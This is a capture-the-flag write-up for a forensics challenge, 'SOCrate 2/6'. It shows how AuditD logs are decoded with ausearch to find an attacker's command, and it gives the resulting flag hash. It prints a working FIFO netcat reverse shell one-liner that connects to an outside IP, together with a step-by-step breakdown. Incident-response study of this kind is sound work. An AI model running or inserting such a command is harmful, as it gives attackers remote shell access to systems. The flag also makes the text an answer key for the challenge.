#  SOCrate 2/6 

**Scenario:**

> In June 2023, a vital operator was the victim of an attack that compromises its entire information system. You have received the Linux and Windows logs and you have to answer questions from the investigators.
>
> The attacker executed a reverse shell on a machine. Retrieve the command corresponding to the execution of this reverse shell.
>
> **Flag format:** `FCSC{sha256(LIGNE_DE_COMMANDE)}`

---

## Objective

Identify the exact reverse shell command executed by the attacker using the provided logs, then compute its **SHA-256 hash** and format it as the flag.

---

## Step 1 — Log Analysis and Decoding

The Linux logs include **AuditD** records. In AuditD, process arguments are often stored in a **hex-encoded** form inside the `PROCTITLE` field. To automatically decode them, we can use `ausearch` with the `-i` (interpret) flag.

We loop through all log files and extract `execve` events, then filter on `nc` (netcat), which is commonly used for reverse shells:

```bash
for logfile in *.log; do
    ausearch -i -if "$logfile" -sc execve 2>/dev/null
done | grep "nc "
```

This command:

* Iterates over all log files
* Decodes hex-encoded fields
* Extracts executed commands
* Filters for suspicious netcat usage

---

## Step 2 — Identify the Malicious Command

The results show multiple connection attempts to the IP address:

```
80.125.9.58
```

The most relevant execution reveals the following command:

```bash
/bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50012 >/tmp/f
```

This is a **FIFO-based reverse shell** using `nc`.

---

## Step 3 — Technical Analysis of the Payload

Breakdown of the command:

* `rm /tmp/f` : Removes any existing FIFO file
* `mkfifo /tmp/f` : Creates a named pipe (FIFO)
* `cat /tmp/f | /bin/sh -i 2>&1` : Feeds input from the FIFO into an interactive shell and redirects stderr
* `nc 80.125.9.58 50012 > /tmp/f` : Connects back to the attacker and redirects their input into the FIFO

This creates a **bidirectional communication channel** between the attacker and the victim shell.

---

## Step 4 — Flag Generation

According to the challenge, we must compute the **SHA-256 hash** of the exact command line:

```bash
echo -n "/bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50012 >/tmp/f" | sha256sum
```

This produces:

```
8fb7da5ebe33913f5439d768dd285433ebf17679ca4c1cfe8c29d7c946e468b8
```

---

## Final Answer

**Flag:**

```
FCSC{8fb7da5ebe33913f5439d768dd285433ebf17679ca4c1cfe8c29d7c946e468b8}
```
